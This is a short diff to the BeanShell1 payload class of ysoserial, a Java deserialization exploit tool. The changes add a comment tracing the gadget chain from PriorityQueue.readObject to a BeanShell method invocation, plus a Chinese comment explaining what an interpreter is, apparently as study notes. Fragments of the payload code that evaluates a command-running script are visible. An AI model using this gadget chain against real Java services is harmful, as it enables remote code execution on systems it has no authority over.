@@ -17,7 +17,18 @@ import ysoserial.payloads.util.PayloadRunner;
 
 /**
  * Credits: Alvaro Munoz (@pwntester) and Christian Schneider (@cschneider4711)
+ *
+ * Gadget chain:
+ * PriorityQueue.readObject()
+ *     HashMap.put()
+ *         heapify()
+ *             siftDown()
+ *                 siftDownUsingComparator()
+ *                     comparator.compare()
+ *                         invokeMethod()
  */
+
+
 
 @SuppressWarnings({"rawtypes", "unchecked"})
 @Dependencies({"org.beanshell:bsh:2.0b5"})
@@ -35,7 +46,7 @@ public class BeanShell1 extends PayloadRunner implements ObjectPayload<PriorityQ
                 "}).start();return new Integer(1);}";
 
         // Create Interpreter
-        Interpreter i = new Interpreter();
+        Interpreter i = new Interpreter();//解释器。定义语言的文法 ,并且建立一个解释器来解释该语言中的句子。通俗来讲就是定义一套规则，然后有个工具类，根据你传入的参数就知道你表达的意思。
 
         // Evaluate payload
         i.eval(payload);
